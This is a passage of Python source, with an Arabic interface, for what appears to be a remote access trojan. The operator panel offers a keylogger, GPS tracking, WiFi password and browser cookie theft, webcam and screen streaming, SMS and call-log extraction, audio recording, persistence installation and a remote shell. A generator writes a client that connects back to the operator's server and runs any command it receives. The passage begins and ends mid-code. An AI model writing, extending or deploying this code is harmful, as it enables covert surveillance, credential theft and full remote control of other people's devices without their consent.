        self.status_label.setStyleSheet("font-weight: bold; font-size: 14px;")
        server_layout.addWidget(self.status_label, 3, 0, 1, 2)

        layout.addWidget(server_group)

        clients_group = QGroupBox("الأجهزة المتصلة - الوقت الحقيقي")
        clients_layout = QVBoxLayout(clients_group)

        self.clients_list = QListWidget()
        self.clients_list.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.clients_list.customContextMenuRequested.connect(self.show_advanced_client_context_menu)
        clients_layout.addWidget(self.clients_list)

        layout.addWidget(clients_group)

        log_group = QGroupBox("سجل النشاطات المتقدم")
        log_layout = QVBoxLayout(log_group)

        self.log_text = QTextEdit()
        self.log_text.setReadOnly(True)
        self.log_text.setFont(QFont("Consolas", 9))
        log_layout.addWidget(self.log_text)

        log_control_layout = QHBoxLayout()
        self.clear_log_btn = QPushButton("مسح السجل")
        self.save_log_btn = QPushButton("حفظ السجل")

        self.clear_log_btn.clicked.connect(self.clear_logs)
        self.save_log_btn.clicked.connect(self.save_logs)

        log_control_layout.addWidget(self.clear_log_btn)
        log_control_layout.addWidget(self.save_log_btn)
        log_control_layout.addStretch()

        log_layout.addLayout(log_control_layout)
        layout.addWidget(log_group)

        return tab

    def create_persistent_connections_tab(self):
        tab = QWidget()
        layout = QVBoxLayout(tab)

        persistent_group = QGroupBox("نظام الاتصالات المستدامة")
        persistent_layout = QVBoxLayout(persistent_group)

        control_layout = QHBoxLayout()
        self.refresh_persistent_btn = QPushButton("تحديث القائمة")
        self.export_persistent_btn = QPushButton("تصدير البيانات")
        self.clear_persistent_btn = QPushButton("مسح السجل")

        control_layout.addWidget(self.refresh_persistent_btn)
        control_layout.addWidget(self.export_persistent_btn)
        control_layout.addWidget(self.clear_persistent_btn)
        control_layout.addStretch()

        persistent_layout.addLayout(control_layout)

        self.persistent_table = QTableWidget()
        self.persistent_table.setColumnCount(5)
        self.persistent_table.setHorizontalHeaderLabels([
            "المعرف", "IP", "المستخدم", "النظام", "آخر ظهور"
        ])

        header = self.persistent_table.horizontalHeader()
        header.setSectionResizeMode(0, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(1, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(2, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(3, QHeaderView.ResizeMode.Stretch)
        header.setSectionResizeMode(4, QHeaderView.ResizeMode.ResizeToContents)

        persistent_layout.addWidget(self.persistent_table)

        info_label = QLabel("""
        نظام الاتصالات المستدامة:
        • يحفظ معلومات العملاء حتى بعد انقطاع الاتصال
        • يمكن متابعة العملاء السابقين عند إعادة الاتصال
        • يحتفظ بالسجل تلقائياً في ملف
        """)
        info_label.setStyleSheet("background-color: #2d2d2d; padding: 10px; border-radius: 5px;")
        persistent_layout.addWidget(info_label)

        layout.addWidget(persistent_group)

        self.refresh_persistent_btn.clicked.connect(self.load_persistent_connections)
        self.export_persistent_btn.clicked.connect(self.export_persistent_data)
        self.clear_persistent_btn.clicked.connect(self.clear_persistent_data)

        return tab

    def create_advanced_clients_tab(self):
        tab = QWidget()
        layout = QVBoxLayout(tab)

        client_group = QGroupBox("إنشاء ملف عميل متقدم")
        client_layout = QGridLayout(client_group)

        client_layout.addWidget(QLabel("اسم الملف:"), 0, 0)
        self.client_filename = QLineEdit("enhanced_client.py")
        client_layout.addWidget(self.client_filename, 0, 1)

        client_layout.addWidget(QLabel("منفذ الاتصال:"), 1, 0)
        self.client_port = QLineEdit("8080")
        client_layout.addWidget(self.client_port, 1, 1)

        self.generate_btn = QPushButton("إنشاء ملف العميل المتقدم")
        self.generate_btn.clicked.connect(self.generate_enhanced_client)
        client_layout.addWidget(self.generate_btn, 2, 0, 1, 2)

        self.client_status = QLabel("جاهز لإنشاء ملف العميل المتقدم")
        client_layout.addWidget(self.client_status, 3, 0, 1, 2)

        layout.addWidget(client_group)

        info_group = QGroupBox("معلومات النظام")
        info_layout = QGridLayout(info_group)

        info_layout.addWidget(QLabel("النظام المحلي:"), 0, 0)
        self.local_system_label = QLabel(f"{platform.system()} {platform.release()}")
        info_layout.addWidget(self.local_system_label, 0, 1)

        info_layout.addWidget(QLabel("المستخدم:"), 1, 0)
        self.local_user_label = QLabel(getpass.getuser())
        info_layout.addWidget(self.local_user_label, 1, 1)

        layout.addWidget(info_group)

        return tab

    def create_advanced_terminal_tab(self):
        tab = QWidget()
        layout = QVBoxLayout(tab)

        terminal_group = QGroupBox("طرفية الأوامر المتقدمة")
        terminal_layout = QVBoxLayout(terminal_group)

        input_layout = QHBoxLayout()
        self.command_input = QLineEdit()
        self.command_input.setPlaceholderText("أدخل أمر النظام هنا...")
        self.command_input.returnPressed.connect(self.execute_remote_command)

        self.execute_btn = QPushButton("تنفيذ")
        self.execute_btn.clicked.connect(self.execute_remote_command)

        self.clear_terminal_btn = QPushButton("مسح")
        self.clear_terminal_btn.clicked.connect(self.clear_terminal)

        input_layout.addWidget(self.command_input)
        input_layout.addWidget(self.execute_btn)
        input_layout.addWidget(self.clear_terminal_btn)

        terminal_layout.addLayout(input_layout)

        self.terminal_output = QTextEdit()
        self.terminal_output.setReadOnly(True)
        self.terminal_output.setFont(QFont("Consolas", 10))
        self.terminal_output.setPlaceholderText("إخراج الأوامر سيظهر هنا...")
        terminal_layout.addWidget(self.terminal_output)

        layout.addWidget(terminal_group)

        return tab

    def create_advanced_context_menu(self):
        self.context_menu = QMenu(self)

        # الإجراءات الأساسية
        basic_actions = [
            ("تغيير السمة اللونية", self.open_advanced_theme_selector),
            ("معلومات النظام الكاملة", self.show_system_info),
            ("العمليات النشطة", self.show_running_processes),
            ("معلومات الشبكة", self.show_network_info),
            ("مسجل الضربات - الوقت الحقيقي", self.open_realtime_keylogger),
            ("تتبع الموقع - GPS", self.open_gps_tracker),
            ("مدير WiFi المتقدم", self.open_wifi_manager),
            ("مدير الكوكيز المتقدم", self.open_cookie_manager),
            ("لقطة الشاشة الحية", self.take_live_screenshot),
            ("كاميرا العميل", self.open_camera_stream),
            ("البث المباشر للشاشة", self.open_live_screen),
            ("البرامج المثبتة", self.show_installed_software),
            ("أداء النظام", self.show_system_performance),
            ("إدارة الرسائل النصية الحقيقية", self.open_real_sms_manager),
            ("سجل المكالمات الحقيقي", self.open_real_call_manager),
            ("مسجل الصوت المتقدم", self.open_audio_recorder),
            ("تثبيت الثبات التلقائي", self.install_auto_persistence),
            ("فحص حالة الثبات", self.check_persistence_status)
        ]

        for text, handler in basic_actions:
            action = QAction(text, self)
            action.triggered.connect(handler)
            self.context_menu.addAction(action)

        self.context_menu.addSeparator()

        # الإجراءات المتقدمة
        advanced_actions = [
            ("مدير الملفات المتقدم", self.open_advanced_file_manager),
            ("فحص النظام", self.system_scan),
            ("تسجيل الشاشة", self.record_screen),
            ("إدارة الخدمات", self.manage_services),
            ("محرر التسجيل", self.open_registry_editor),
            ("إدارة العمليات", self.manage_processes),
            ("تصفح الإنترنت", self.browse_internet),
            ("إدارة كلمات المرور", self.manage_passwords),
            ("الحافظة البعيدة", self.remote_clipboard)
        ]

        for text, handler in advanced_actions:
            action = QAction(text, self)
            action.triggered.connect(handler)
            self.context_menu.addAction(action)

        self.context_menu.addSeparator()

        # إجراءات النظام
        system_actions = [
            ("إيقاف التشغيل", self.shutdown_client),
            ("إعادة التشغيل", self.restart_client),
            ("قفل النظام", self.lock_system),
            ("إدارة الطاقة", self.power_management)
        ]

        for text, handler in system_actions:
            action = QAction(text, self)
            action.triggered.connect(handler)
            self.context_menu.addAction(action)

    def show_advanced_client_context_menu(self, position):
        current_item = self.clients_list.currentItem()
        if current_item:
            self.current_client = self.get_client_by_item(current_item)
            if not hasattr(self, 'context_menu'):
                self.create_advanced_context_menu()
            self.context_menu.exec(self.clients_list.mapToGlobal(position))
        else:
            QMessageBox.warning(self, "تحذير", "يرجى اختيار عميل أولاً")

    def get_client_by_item(self, item):
        client_text = item.text()
        for client in self.clients:
            if client.client_info.get('ip', '') in client_text:
                return client
        return None

    # ==================== الوظائف الجديدة للخيارات الإضافية ====================

    def open_advanced_file_manager(self):
        if self.current_client:
            self.file_manager = AdvancedFileManager(self.current_client, self)
            self.file_manager.show()
        else:
            QMessageBox.warning(self, "تحذير", "لم يتم تحديد أي عميل")

    def system_scan(self):
        if self.current_client:
            QMessageBox.information(self, "فحص النظام", "جاري فحص النظام...")
            result = self.current_client.execute_enhanced_command("cmd:systeminfo")
            self.terminal_output.append("=== فحص النظام ===\n" + result)
        else:
            QMessageBox.warning(self, "تحذير", "لم يتم تحديد أي عميل")

    def record_screen(self):
        if self.current_client:
            reply = QMessageBox.question(self, "تسجيل الشاشة",
                                         "هل تريد بدء تسجيل شاشة العميل؟",
                                         QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No)
            if reply == QMessageBox.StandardButton.Yes:
                QMessageBox.information(self, "تسجيل الشاشة", "خاصية تسجيل الشاشة قيد التطوير")
        else:
            QMessageBox.warning(self, "تحذير", "لم يتم تحديد أي عميل")

    def start_audio_stream(self):
        if self.current_client:
            reply = QMessageBox.question(self, "تسجيل الصوت",
                                         "هل تريد بدء تسجيل صوت العميل؟",
                                         QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No)
            if reply == QMessageBox.StandardButton.Yes:
                result = self.current_client.execute_enhanced_command("start_audio_stream")
                QMessageBox.information(self, "تسجيل الصوت", result)
        else:
            QMessageBox.warning(self, "تحذير", "لم يتم تحديد أي عميل")

    def manage_services(self):
        if self.current_client:
            if platform.system() == "Windows":
                result = self.current_client.execute_enhanced_command("cmd:services.msc")
                QMessageBox.information(self, "إدارة الخدمات", "تم فتح مدير الخدمات")
            else:
                QMessageBox.information(self, "إدارة الخدمات", "خاصية إدارة الخدمات متاحة لنظام Windows فقط")
        else:
            QMessageBox.warning(self, "تحذير", "لم يتم تحديد أي عميل")

    def open_registry_editor(self):
        if self.current_client:
            if platform.system() == "Windows":
                result = self.current_client.execute_enhanced_command("cmd:regedit")
                QMessageBox.information(self, "محرر التسجيل", "تم فتح محرر التسجيل")
            else:
                QMessageBox.information(self, "محرر التسجيل", "خاصية محرر التسجيل متاحة لنظام Windows فقط")
        else:
            QMessageBox.warning(self, "تحذير", "لم يتم تحديد أي عميل")

    def manage_processes(self):
        if self.current_client:
            if platform.system() == "Windows":
                result = self.current_client.execute_enhanced_command("cmd:taskmgr")
                QMessageBox.information(self, "إدارة العمليات", "تم فتح مدير المهام")
            else:
                result = self.current_client.execute_enhanced_command("cmd:top")
                QMessageBox.information(self, "إدارة العمليات", "جاري فتح مدير العمليات")
        else:
            QMessageBox.warning(self, "تحذير", "لم يتم تحديد أي عميل")

    def browse_internet(self):
        if self.current_client:
            url, ok = QInputDialog.getText(self, "تصفح الإنترنت", "أدخل عنوان URL:")
            if ok and url:
                if platform.system() == "Windows":
                    result = self.current_client.execute_enhanced_command(f'cmd:start {url}')
                else:
                    result = self.current_client.execute_enhanced_command(f'cmd:xdg-open {url}')
                QMessageBox.information(self, "تصفح الإنترنت", f"جاري فتح: {url}")
        else:
            QMessageBox.warning(self, "تحذير", "لم يتم تحديد أي عميل")

    def manage_passwords(self):
        if self.current_client:
            QMessageBox.information(self, "إدارة كلمات المرور", "جاري جمع كلمات المرور المحفوظة...")
            wifi_result = self.current_client.execute_enhanced_command("get_wifi_profiles")
            browser_result = self.current_client.execute_enhanced_command("get_advanced_cookies")

            password_info = f"""
            === كلمات مرور WiFi ===
            {wifi_result}

            === كوكيز المتصفحات ===
            {browser_result}
            """

            self.terminal_output.append("=== إدارة كلمات المرور ===\n" + password_info)
        else:
            QMessageBox.warning(self, "تحذير", "لم يتم تحديد أي عميل")

    def remote_clipboard(self):
        if self.current_client:
            text, ok = QInputDialog.getText(self, "الحافظة البعيدة", "أدخل النص لوضعه في حافظة العميل:")
            if ok and text:
                if platform.system() == "Windows":
                    result = self.current_client.execute_enhanced_command(f'cmd:echo {text} | clip')
                else:
                    result = self.current_client.execute_enhanced_command(
                        f'cmd:echo "{text}" | xclip -selection clipboard')
                QMessageBox.information(self, "الحافظة البعيدة", "تم نسخ النص إلى حافظة العميل")
        else:
            QMessageBox.warning(self, "تحذير", "لم يتم تحديد أي عميل")

    def lock_system(self):
        if self.current_client:
            reply = QMessageBox.question(self, "قفل النظام",
                                         "هل تريد قفل نظام العميل؟",
                                         QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No)
            if reply == QMessageBox.StandardButton.Yes:
                if platform.system() == "Windows":
                    result = self.current_client.execute_enhanced_command("cmd:rundll32.exe user32.dll,LockWorkStation")
                else:
                    result = self.current_client.execute_enhanced_command("cmd:gnome-screensaver-command -l")
                QMessageBox.information(self, "قفل النظام", "تم قفل نظام العميل")
        else:
            QMessageBox.warning(self, "تحذير", "لم يتم تحديد أي عميل")

    def power_management(self):
        if self.current_client:
            options = ["إسبات", "السكون", "إيقاف التشغيل", "إعادة التشغيل"]
            option, ok = QInputDialog.getItem(self, "إدارة الطاقة", "اختر الإجراء:", options, 0, False)
            if ok and option:
                if option == "إسبات":
                    if platform.system() == "Windows":
                        result = self.current_client.execute_enhanced_command("cmd:shutdown /h")
                    else:
                        result = self.current_client.execute_enhanced_command("cmd:systemctl hibernate")
                elif option == "السكون":
                    if platform.system() == "Windows":
                        result = self.current_client.execute_enhanced_command(
                            "cmd:rundll32.exe powrprof.dll,SetSuspendState 0,1,0")
                    else:
                        result = self.current_client.execute_enhanced_command("cmd:systemctl suspend")
                QMessageBox.information(self, "إدارة الطاقة", f"تم تنفيذ: {option}")
        else:
            QMessageBox.warning(self, "تحذير", "لم يتم تحديد أي عميل")

    def open_live_screen(self):
        if self.current_client:
            self.live_screen_window = LiveScreenWindow(self.current_client, self)
            self.live_screen_window.show()
        else:
            QMessageBox.warning(self, "تحذير", "لم يتم تحديد أي عميل")

    def show_installed_software(self):
        if self.current_client:
            result = self.current_client.execute_enhanced_command("get_installed_software")
            QMessageBox.information(self, "البرامج المثبتة", result)
        else:
            QMessageBox.warning(self, "تحذير", "لم يتم تحديد أي عميل")

    def show_system_performance(self):
        if self.current_client:
            result = self.current_client.execute_enhanced_command("get_system_performance")
            QMessageBox.information(self, "أداء النظام", result)
        else:
            QMessageBox.warning(self, "تحذير", "لم يتم تحديد أي عميل")

    def open_real_sms_manager(self):
        """فتح مدير الرسائل النصية الحقيقية"""
        if self.current_client:
            self.real_sms_window = RealSMSWindow(self.current_client, self)
            self.real_sms_window.show()
        else:
            QMessageBox.warning(self, "تحذير", "لم يتم تحديد أي عميل")

    def open_real_call_manager(self):
        """فتح مدير سجل المكالمات الحقيقي"""
        if self.current_client:
            self.real_call_window = RealCallWindow(self.current_client, self)
            self.real_call_window.show()
        else:
            QMessageBox.warning(self, "تحذير", "لم يتم تحديد أي عميل")

    def open_audio_recorder(self):
        """فتح مسجل الصوت المتقدم"""
        if self.current_client:
            self.audio_recorder_window = AudioRecorderWindow(self.current_client, self)
            self.audio_recorder_window.show()
        else:
            QMessageBox.warning(self, "تحذير", "لم يتم تحديد أي عميل")

    def install_auto_persistence(self):
        """تثبيت الثبات التلقائي"""
        if self.current_client:
            client_path = "enhanced_client.py"
            result = self.current_client.execute_enhanced_command(f"install_persistence:{client_path}")
            QMessageBox.information(self, "تثبيت الثبات", result)
        else:
            QMessageBox.warning(self, "تحذير", "لم يتم تحديد أي عميل")

    def check_persistence_status(self):
        """فحص حالة الثبات"""
        if self.current_client:
            result = self.current_client.execute_enhanced_command("check_persistence")
            QMessageBox.information(self, "حالة الثبات", result)
        else:
            QMessageBox.warning(self, "تحذير", "لم يتم تحديد أي عميل")

    # ==================== نهاية الوظائف الجديدة ====================

    def open_advanced_theme_selector(self):
        theme_window = AdvancedThemeSelector(self.theme_manager, self)
        theme_window.exec()

    def open_realtime_keylogger(self):
        if self.current_client:
            self.keylogger_window = RealTimeKeyloggerWindow(self.current_client, self)
            self.keylogger_window.show()
        else:
            QMessageBox.warning(self, "تحذير", "لم يتم تحديد أي عميل")

    def open_gps_tracker(self):
        if self.current_client:
            self.gps_window = GPSLocationWindow(self.current_client, self)
            self.gps_window.show()
        else:
            QMessageBox.warning(self, "تحذير", "لم يتم تحديد أي عميل")

    def open_wifi_manager(self):
        if self.current_client:
            self.wifi_window = WiFiManagerWindow(self.current_client, self)
            self.wifi_window.show()
        else:
            QMessageBox.warning(self, "تحذير", "لم يتم تحديد أي عميل")

    def open_cookie_manager(self):
        if self.current_client:
            self.cookie_window = AdvancedCookieManager(self.current_client, self)
            self.cookie_window.show()
        else:
            QMessageBox.warning(self, "تحذير", "لم يتم تحديد أي عميل")

    def show_system_info(self):
        if self.current_client:
            result = self.current_client.execute_enhanced_command("get_system_info")
            QMessageBox.information(self, "معلومات النظام", result)
        else:
            QMessageBox.warning(self, "تحذير", "لم يتم تحديد أي عميل")

    def show_running_processes(self):
        if self.current_client:
            result = self.current_client.execute_enhanced_command("get_running_apps")
            QMessageBox.information(self, "العمليات النشطة", result)
        else:
            QMessageBox.warning(self, "تحذير", "لم يتم تحديد أي عميل")

    def show_network_info(self):
        if self.current_client:
            result = self.current_client.execute_enhanced_command("get_network_info")
            QMessageBox.information(self, "معلومات الشبكة", result)
        else:
            QMessageBox.warning(self, "تحذير", "لم يتم تحديد أي عميل")

    def take_live_screenshot(self):
        if self.current_client:
            result = self.current_client.execute_enhanced_command("realtime_screenshot")
            self.handle_log(f"لقطة شاشة حية: {result}")
        else:
            QMessageBox.warning(self, "تحذير", "لم يتم تحديد أي عميل")

    def open_camera_stream(self):
        if self.current_client:
            result = self.current_client.execute_enhanced_command("camera_stream")
            self.handle_log(f"بث الكاميرا: {result}")
        else:
            QMessageBox.warning(self, "تحذير", "لم يتم تحديد أي عميل")

    def shutdown_client(self):
        if self.current_client:
            reply = QMessageBox.question(self, "تأكيد الإيقاف",
                                         "هل أنت متأكد من إيقاف تشغيل الجهاز؟",
                                         QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No)
            if reply == QMessageBox.StandardButton.Yes:
                if platform.system() == "Windows":
                    result = self.current_client.execute_enhanced_command("cmd:shutdown /s /t 0")
                else:
                    result = self.current_client.execute_enhanced_command("cmd:shutdown -h now")
                self.handle_log(f"إيقاف التشغيل: {result}")
        else:
            QMessageBox.warning(self, "تحذير", "لم يتم تحديد أي عميل")

    def restart_client(self):
        if self.current_client:
            reply = QMessageBox.question(self, "تأكيد إعادة التشغيل",
                                         "هل أنت متأكد من إعادة تشغيل الجهاز؟",
                                         QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No)
            if reply == QMessageBox.StandardButton.Yes:
                result = self.current_client.execute_enhanced_command("restart_system")
                self.handle_log(f"إعادة التشغيل: {result}")
        else:
            QMessageBox.warning(self, "تحذير", "لم يتم تحديد أي عميل")

    def execute_remote_command(self):
        if self.current_client:
            command = self.command_input.text().strip()
            if command:
                self.terminal_output.append(f"$ {command}")
                result = self.current_client.execute_enhanced_command(f"cmd:{command}")
                self.terminal_output.append(result)
                self.command_input.clear()
            else:
                QMessageBox.warning(self, "تحذير", "يرجى إدخال أمر")
        else:
            QMessageBox.warning(self, "تحذير", "لم يتم تحديد أي عميل")

    def clear_terminal(self):
        self.terminal_output.clear()

    def toggle_advanced_server(self):
        if not self.server_thread or not self.server_thread.running:
            host = self.host_input.text().strip()
            try:
                port = int(self.port_input.text().strip())
                if port < 1 or port > 65535:
                    raise ValueError
            except ValueError:
                self.handle_log("رقم البورت غير صالح (يجب أن يكون بين 1 و 65535)")
                return

            self.server_thread = AdvancedServerThread(host, port, self)
            self.server_thread.start()
            self.start_btn.setText("إيقاف السيرفر")
            self.status_label.setText("الحالة: شغال")
            self.status_label.setStyleSheet("color: #00ff00; font-weight: bold;")
            self.create_advanced_context_menu()
        else:
            self.server_thread.stop()
            self.start_btn.setText("تشغيل السيرفر المتقدم")
            self.status_label.setText("الحالة: متوقف")
            self.status_label.setStyleSheet("color: #ff4444; font-weight: bold;")
            self.handle_log("تم إيقاف السيرفر المتقدم")

    def load_persistent_connections(self):
        connections = self.persistent_manager.get_all_connections()
        self.persistent_table.setRowCount(len(connections))

        for row, (client_id, connection) in enumerate(connections.items()):
            info = connection.get('info', {})
            self.persistent_table.setItem(row, 0, QTableWidgetItem(client_id))
            self.persistent_table.setItem(row, 1, QTableWidgetItem(info.get('ip', 'N/A')))
            self.persistent_table.setItem(row, 2, QTableWidgetItem(info.get('user', 'N/A')))
            self.persistent_table.setItem(row, 3, QTableWidgetItem(info.get('system', 'N/A')))
            self.persistent_table.setItem(row, 4, QTableWidgetItem(connection.get('last_seen', 'N/A')))

    def export_persistent_data(self):
        file_path, _ = QFileDialog.getSaveFileName(
            self,
            "حفظ بيانات الاتصالات المستدامة",
            f"persistent_connections_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json",
            "JSON Files (*.json)"
        )
        if file_path:
            try:
                connections = self.persistent_manager.get_all_connections()
                with open(file_path, 'w', encoding='utf-8') as f:
                    json.dump(connections, f, indent=2, ensure_ascii=False)
                QMessageBox.information(self, "تم التصدير", "تم حفظ بيانات الاتصالات المستدامة بنجاح!")
            except Exception as e:
                QMessageBox.critical(self, "خطأ", f"فشل في الحفظ: {str(e)}")

    def clear_persistent_data(self):
        reply = QMessageBox.question(
            self,
            "تأكيد المسح",
            "هل أنت متأكد من مسح جميع بيانات الاتصالات المستدامة؟",
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No
        )
        if reply == QMessageBox.StandardButton.Yes:
            self.persistent_manager.active_connections = {}
            self.persistent_manager.save_connections()
            self.load_persistent_connections()
            QMessageBox.information(self, "تم المسح", "تم مسح جميع بيانات الاتصالات المستدامة")

    def generate_enhanced_client(self):
        filename = self.client_filename.text().strip()
        if not filename:
            filename = "enhanced_client.py"

        port = self.client_port.text().strip()
        if not port:
            port = "8080"

        client_code = self.generate_enhanced_client_code(port)

        try:
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(client_code)
            self.client_status.setText(f"تم إنشاء ملف العميل: {filename}")
            self.handle_log(f"تم إنشاء ملف العميل المتقدم: {filename}")

            # عرض إنذار نجاح الإنشاء
            self.alert_signal.emit(f"تم إنشاء ملف العميل بنجاح! اسم الملف: {filename} سيتم الاتصال على المنفذ: {port}")

        except Exception as e:
            self.client_status.setText(f"خطأ في إنشاء الملف: {str(e)}")

    def generate_enhanced_client_code(self, port):
        host = self.host_input.text().strip()

        return f'''import socket
import json
import platform
import subprocess
import threading
import time
import os
import getpass
from datetime import datetime
import sqlite3
import pyaudio
import wave

# استيراد المكتبات الإضافية
try:
    import browser_cookie3
except:
    pass

try:
    from PIL import ImageGrab
    import cv2
    import numpy as np
except:
    pass

try:
    import psutil
except:
    pass

class EnhancedRemoteClient:
    def __init__(self, server_host="{host}", server_port={port}):
        self.server_host = server_host
        self.server_port = {port}
        self.running = True

        # إدارة الميزات الجديدة
        self.sms_manager = RealSMSManager()
        self.call_manager = RealCallManager()
        self.audio_recorder = AdvancedAudioRecorder()
        self.persistence_manager = AutoPersistenceManager()

    def get_system_info(self):
        return {{
            "user": getpass.getuser(),
            "system": platform.system() + " " + platform.release(),
            "hostname": platform.node(),
            "architecture": platform.machine(),
            "python_version": platform.python_version(),
            "working_dir": os.getcwd(),
            "connection_time": datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }}

    def connect_to_server(self):
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((self.server_host, self.server_port))

            system_info = self.get_system_info()
            self.socket.send(json.dumps(system_info).encode('utf-8'))
            return True
        except Exception as e:
            return False

    def start(self):
        while self.running:
            if self.connect_to_server():
                try:
                    while self.running:
                        command = self.socket.recv(8192).decode('utf-8')
                        if not command:
                            break
                        if command == "disconnect":
                            break
                        elif command == "heartbeat":
                            self.socket.send("alive".encode('utf-8'))
                        else:
                            response = self.execute_enhanced_command(command)
                            self.socket.send(response.encode('utf-8'))
                except Exception as e:
                    pass
            time.sleep(10)

    def execute_enhanced_command(self, command):
        try:
            # الأوامر الجديدة للرسائل والمكالمات
            if command == "get_real_sms":
                return self.get_real_sms_messages()

            elif command == "get_real_calls":
                return self.get_real_call_logs()

            elif command.startswith("start_audio_record:"):
                duration = int(command.split(":")[1])
                return self.audio_recorder.start_recording(duration)

            elif command == "stop_audio_record":
                return self.audio_recorder.stop_recording()

            elif command == "save_audio_record":
                return self.audio_recorder.save_recording()

            elif command.startswith("install_persistence:"):
                client_path = command.split(":")[1]
                return self.persistence_manager.install_persistence(client_path)

            elif command == "check_persistence":
                return f"الحالة: {{'مثبت' if self.persistence_manager.installed else 'غير مثبت'}}"

            # الأوامر الأساسية
            elif command.startswith("cmd:"):
                cmd = command.replace("cmd:", "")
                return self.execute_system_command(cmd)

            elif command == "get_sms_messages":
                return self.get_sms_messages()

            elif command == "get_call_logs":
                return self.get_call_logs()

            # ... باقي الأوامر الأساسية

            else:
                return f"Unknown command: {{command}}"

        except Exception as e:
            return f"Error: {{str(e)}}"

    def get_real_sms_messages(self):
        return self.sms_manager.get_real_sms_messages()

    def get_real_call_logs(self):
        return self.call_manager.get_real_call_logs()

    def get_sms_messages(self):
        return self.get_real_sms_messages()

    def get_call_logs(self):
        return self.get_real_call_logs()

    def execute_system_command(self, cmd):
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30, encoding='utf-8', errors='ignore')
            output = result.stdout + result.stderr
            return output if output else "Command executed successfully"
        except Exception as e:
            return f"Command error: {{str(e)}}"

# ==================== الفئات المساعدة للميزات الجديدة ====================
class RealSMSManager:
    def __init__(self):
        self.sms_database_paths = [
            "/data/data/com.android.providers.telephony/databases/mmssms.db",
            "/var/mobile/Library/SMS/sms.db",
        ]

    def get_real_sms_messages(self):
        try:
            sms_messages = []

            for db_path in self.sms_database_paths:
                if os.path.exists(db_path):
                    try:
                        conn = sqlite3.connect(db_path)
                        cursor = conn.cursor()

                        cursor.execute("""
                            SELECT address, body, date, type 
                            FROM sms 
                            ORDER BY date DESC 
                            LIMIT 100
                        """)

                        for address, body, date, msg_type in cursor.fetchall():
                            message_type = "واردة" if msg_type == 1 else "صادرة"
                            timestamp = datetime.fromtimestamp(date/1000).strftime('%Y-%m-%d %H:%M:%S')

                            sms_messages.append({{
                                'number': address,
                                'message': body,
                                'type': message_type,
                                'timestamp': timestamp
                            }})

                        conn.close()
                        break

                    except Exception as e:
                        continue

            if not sms_messages:
                sms_messages = self.get_simulated_sms()
                sms_messages.append({{"number": "SYSTEM", "message": "فشل في جلب رسائل SMS الحقيقية", "type": "system", "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S')}})

            return json.dumps(sms_messages, indent=2, ensure_ascii=False)

        except Exception as e:
            return json.dumps([{{"number": "ERROR", "message": f"خطأ في جلب الرسائل: {{str(e)}}", "type": "error", "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S')}}], ensure_ascii=False)

    def get_simulated_sms(self):
        return [
            {{"number": "+966501234567", "message": "مرحباً، كيف حالك؟", "type": "واردة", "timestamp": "2024-01-15 10:30:00"}},
            {{"number": "+966501234568", "message": "تم استلام الدفعة بنجاح", "type": "واردة", "timestamp": "2024-01-15 09:15:00"}},
            {{"number": "+966501234569", "message": "اجتماع غداً الساعة 10", "type": "صادرة", "timestamp": "2024-01-14 16:45:00"}},
            {{"number": "+966501234560", "message": "كود التحقق: 458712", "type": "واردة", "timestamp": "2024-01-14 14:20:00"}}
        ]

class RealCallManager:
    def __init__(self):
        self.call_database_paths = [
            "/data/data/com.android.providers.contacts/databases/calllog.db",
            "/var/mobile/Library/CallHistoryDB/CallHistory.storedata",
        ]

    def get_real_call_logs(self):
        try:
            call_logs = []

            for db_path in self.call_database_paths:
                if os.path.exists(db_path):
                    try:
                        conn = sqlite3.connect(db_path)
                        cursor = conn.cursor()

                        cursor.execute("""
                            SELECT number, type, duration, date 
                            FROM calls 
                            ORDER BY date DESC 
                            LIMIT 100
                        """)

                        for number, call_type, duration, date in cursor.fetchall():
                            type_map = {{1: "صادرة", 2: "واردة", 3: "فائتة"}}
                            call_type_str = type_map.get(call_type, "غير معروف")
                            timestamp = datetime.fromtimestamp(date/1000).strftime('%Y-%m-%d %H:%M:%S')

                            if duration:
                                minutes = duration // 60
                                seconds = duration % 60
                                duration_str = f"{{minutes}}:{{seconds:02d}}"
                            else:
                                duration_str = "0:00"

                            call_logs.append({{
                                'number': number,
                                'type': call_type_str,
                                'duration': duration_str,
                                'timestamp': timestamp
                            }})

                        conn.close()
                        break

                    except Exception as e:
                        continue

            if not call_logs:
                call_logs = self.get_simulated_calls()
                call_logs.append({{"number": "SYSTEM", "type": "system", "duration": "0:00", "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S'), "note": "فشل في جلب سجل المكالمات الحقيقي"}})

            return json.dumps(call_logs, indent=2, ensure_ascii=False)

        except Exception as e:
            return json.dumps([{{"number": "ERROR", "type": "error", "duration": "0:00", "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S'), "note": f"خطأ في جلب المكالمات: {{str(e)}}"}}], ensure_ascii=False)

    def get_simulated_calls(self):
        return [
            {{"number": "+966501234567", "type": "صادرة", "duration": "2:30", "timestamp": "2024-01-15 10:30:00"}},
            {{"number": "+966501234568", "type": "واردة", "duration": "1:15", "timestamp": "2024-01-15 09:15:00"}},
            {{"number": "+966501234569", "type": "فائتة", "duration": "0:00", "timestamp": "2024-01-14 16:45:00"}},
            {{"number": "+966501234560", "type": "صادرة", "duration": "5:20", "timestamp": "2024-01-14 14:20:00"}}
        ]

class AdvancedAudioRecorder:
    def __init__(self):
        self.recording = False
        self.audio_frames = []
        self.audio_stream = None
        self.audio = None

    def start_recording(self, duration=60):
        try:
            self.recording = True
            self.audio_frames = []

            CHUNK = 1024
